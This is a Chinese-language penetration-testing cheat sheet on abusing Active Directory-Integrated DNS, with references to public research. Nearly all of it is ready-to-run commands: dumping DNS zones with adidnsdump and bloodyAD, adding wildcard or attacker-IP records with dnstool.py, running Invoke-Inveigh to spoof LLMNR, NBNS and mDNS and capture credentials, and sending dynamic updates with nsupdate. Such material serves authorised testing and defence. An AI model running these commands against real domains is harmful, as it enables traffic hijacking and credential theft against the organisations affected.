# Active Directory - 集成 DNS - ADIDNS

ADIDNS 区域 DACL（自主访问控制列表）默认允许普通用户创建子对象，攻击者可以利用这一点劫持流量。Active Directory 需要一定时间（约 180 秒）通过 DNS 动态更新协议同步 LDAP 更改。

## 基于 LDAP（需要身份验证）

* 枚举所有记录

    ```ps1
    adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp (--dns-tcp)
    # 或
    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 get dnsDump
    ```

* 查询节点

    ```ps1
    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController (--legacy)
    # 或
    bloodyAD -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'DC=DomainDnsZones,DC=bloody,DC=lab' --filter '(&(name=allmightyDC)(objectClass=dnsNode))' --attr dnsRecord
    ```

* 添加节点并附加记录

    ```ps1
    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
    # 或
    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 add dnsRecord dc1.example.lab <Attacker IP>

    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 remove dnsRecord dc1.example.lab <Attacker IP>
    ```

滥用 ADIDNS 的常见方式是设置通配符记录，然后被动监听网络。

```ps1
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```

## 动态更新（不需要身份验证）

动态 DNS（RFC 2136）允许使用 DNS 协议更新 DNS 记录：

1. 如果区域设置为仅安全，你需要有效的 Kerberos 票据。

2. 如果区域设置为非安全和安全，网络上的任何人都可以发送更新。

更新记录：

```ps1
# Linux
cat << EOF > dnsupdate.txt
server dc.domain.corp
zone domain.corp
update delete test.domain.corp A
update add test.domain.corp 3600 A 10.10.10.123
send
EOF

nsupdate dnsupdate.txt

# Windows
Invoke-DNSupdate -DNSType A -DNSName test -DNSData 192.168.125.100 -Verbose
```

## DNS 侦察

执行 **ADIDNS** 搜索

```powershell
StandIn.exe --dns --limit 20
StandIn.exe --dns --filter SQL --limit 10
StandIn.exe --dns --forest --domain <domain> --user <username> --pass <password>
StandIn.exe --dns --legacy --domain <domain> --user <username> --pass <password>
```

## 参考资料

* [Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema](https://blog.fox-it.com/2019/04/25/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/)
* [ADIDNS Revisited – WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)
* [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
